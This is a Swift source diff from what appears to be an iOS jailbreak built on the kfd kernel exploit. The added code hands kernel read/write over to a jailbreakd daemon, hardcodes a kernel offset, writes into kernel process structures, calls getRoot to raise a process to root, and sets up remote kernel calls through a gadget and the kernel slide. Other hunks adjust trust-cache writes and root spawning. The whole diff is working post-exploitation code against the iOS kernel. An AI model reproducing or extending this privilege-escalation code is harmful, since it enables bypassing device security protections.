@@ -114,6 +114,8 @@ class Jailbreak {
         print("stage2!"); sleep(1);
         stage2(kfd)
         
+        print("test");sleep(1);
+                        
         isCurrentlyPostExploit = true
         
         //set_csflags(kfd, kfd_struct(kfd).pointee.info.kernel.current_proc)
@@ -133,6 +135,29 @@ class Jailbreak {
         } else {
             kpf = try _makeKPF()
         }
+        
+        if let kalloc = kpf.kalloc_data_external {
+            kalloc_data_extern = kalloc
+        } else {
+            print("no kalloc_data_extern")
+            kalloc_data_extern = 0xFFFFFFF007188AE8 // 6s 15.1 offset
+        }
+        
+        #if false
+        print(String(format: "%02X", kckr32(virt: kfd_struct(kfd).pointee.info.kernel.current_proc + 0x10)), String(format: "%02llX", kckr64(virt: kfd_struct(kfd).pointee.info.kernel.current_proc + 0x10))); sleep(1);
+        
+        let backup = kckr32(virt: kfd_struct(kfd).pointee.info.kernel.current_proc + 0xC0)
+        kckw32(virt: kfd_struct(kfd).pointee.info.kernel.current_proc + 0xC0, what: 4141)
+        let new = kckr32(virt: kfd_struct(kfd).pointee.info.kernel.current_proc + 0xC0)
+        kckw32(virt: kfd_struct(kfd).pointee.info.kernel.current_proc + 0xC0, what: backup)
+        
+        print(String(format: "backup: %02llX new: %02llX", backup, new)); sleep(1);
+        
+        print("done testing");sleep(1);
+
+        #endif
+        
+        //print(kalloc_data(0x4000))
         
         print("set csflags"); sleep(1);
         
@@ -173,11 +198,10 @@ class Jailbreak {
         
         Logger.shared.startListeningToFileLogChanges()
         
-        try initializeJBD(withKFD: kfd)
+        let jbdPID = try initializeJBD(withKFD: kfd)
         
         //handoffKernRw(jbdExec.pid, ourPrebootPath.appending("/basebin/jailbreakd"))
         
-        /*
         let dict = xpc_dictionary_create_empty()!
         xpc_dictionary_set_int64(dict, "id", JailbreakdMessageID.helloWorld.rawValue)
         
@@ -186,12 +210,49 @@ class Jailbreak {
         } else {
             print("replyDict returned nil.")
         }
-         */
+        
+        // BEGIN KRW HANDOFF
+                
+        let jbdProc = proc_of_pid(kfd, jbdPID)
+        let jbdTask = _kread64(kfd, jbdProc + 0x10)
+                
+        let dict2 = xpc_dictionary_create_empty()!
+        xpc_dictionary_set_int64(dict2, "id", JailbreakdMessageID.krwBegin.rawValue)
+        
+        if let replyDict = sendJBDMessage(dict2) {
+            print(String(cString: xpc_copy_description(replyDict)))
+            
+            let port: mach_port_t = UInt32(xpc_dictionary_get_uint64(replyDict, "port"))
+            
+            print("jbdPID", jbdPID, "port", port)
+            
+            print("jbdTask:", String(format: "0x%02llX", jbdTask))
+            
+            getRoot(kfd, jbdProc)
+            
+            let fakeClient = init_kcall_remote(kfd, jbdTask, port)
+            kcallread_raw_init(fakeClient, rk32_static_gadget + kernel_slide)
+            
+        } else {
+            print("replyDict returned nil.")
+        }
+        
+        let readyDict = xpc_dictionary_create_empty()!
+        xpc_dictionary_set_int64(readyDict, "id", JailbreakdMessageID.krwReady.rawValue)
+        
+        xpc_dictionary_set_uint64(readyDict, "slide", kernel_slide);
+        xpc_dictionary_set_uint64(readyDict, "proc", current_proc);
+        
+        if let replyDict = sendJBDMessage(readyDict) {
+            print(String(cString: xpc_copy_description(replyDict)))
+        } else {
+            print("replyDict returned nil.")
+        }
     }
     
-    func initializeJBD(withKFD kfd: u64) throws {
+    func initializeJBD(withKFD kfd: u64) throws -> pid_t {
         let jbdPath = "/var/jb/basebin/jailbreakd"
-        let jbdExec = try execCmd(args: [jbdPath], waitPid: false)
+        let (result, pid) = try execCmd(args: [jbdPath], waitPid: false, root: false)
         sleep(2)
         
         print("spawned jbd, doing handoff!")
@@ -207,6 +268,8 @@ class Jailbreak {
         print("kfd, client: \(kfd)")
         
         sendJBDMessage(dict)
+        
+        return pid
     }
     
     func start(puaf_pages: UInt64, puaf_method: UInt64, kread_method: UInt64, kwrite_method: UInt64) async throws {
@@ -250,11 +313,11 @@ class Jailbreak {
         let us   = mem + 0x8
         let tc   = mem + 0x10
         
-        print("writing in us:", us); sleep(1)
+        print("writing in us:", us)
         
         _kwrite64(kfd, us, mem+0x10)
         
-        print("writing in tc:", tc); sleep(1)
+        print("writing in tc:", tc)
         
         var data = data
         hexdump(data.withUnsafeMutableBytes { $0.baseAddress! }, UInt32(data.count))
@@ -265,7 +328,7 @@ class Jailbreak {
         
         let cur = _kread64(kfd, pitc)
         
-        print("cur:", cur); sleep(1)
+        print("cur:", cur)
         
         // Read head
         guard cur != 0 else {
@@ -276,7 +339,7 @@ class Jailbreak {
         
         _kwrite64(kfd, next, cur)
         
-        print("wrote in cur", cur); sleep(1)
+        print("wrote in cur", cur)
         
         // Replace head
         _kwrite64(kfd, pitc, mem)
@@ -370,14 +433,16 @@ class Jailbreak {
         return tc
     }
     
-    func execCmd(args: [String], fileActions: posix_spawn_file_actions_t? = nil, waitPid: Bool) throws -> (posixSpawnStatus: Int32, pid: pid_t) {
+    func execCmd(args: [String], fileActions: posix_spawn_file_actions_t? = nil, waitPid: Bool, root: Bool = true) throws -> (posixSpawnStatus: Int32, pid: pid_t) {
         //var fileActions = fileActions
         
         var attr: posix_spawnattr_t?
         posix_spawnattr_init(&attr)
-        posix_spawnattr_set_persona_np(&attr, 99, 1)
-        posix_spawnattr_set_persona_uid_np(&attr, 0)
-        posix_spawnattr_set_persona_gid_np(&attr, 0)
+        if root {
+            posix_spawnattr_set_persona_np(&attr, 99, 1)
+            posix_spawnattr_set_persona_uid_np(&attr, 0)
+            posix_spawnattr_set_persona_gid_np(&attr, 0)
+        }
         
         var pid: pid_t = 0
         var argv: [UnsafeMutablePointer<CChar>?] = []
@@ -397,8 +462,15 @@ class Jailbreak {
         
         let result = posix_spawn(&pid, argv[0], nil, nil, &argv, environ)
         guard result == 0 else {
-            throw StringError("Failed to posix_spawn with \(args), Error: \(String(cString: strerror(result))) (Errno \(result))")
+            if let err = strerror(result) {
+                print("err:", String(cString: strerror(result)))
+            } else {
+                print("no err")
+            }
+            throw StringError("Failed to posix_spawn with \(args) (Errno \(result))")
         }
+        
+        print("spawned"); sleep(1);
         
         var status: Int32 = 0
         if waitPid {
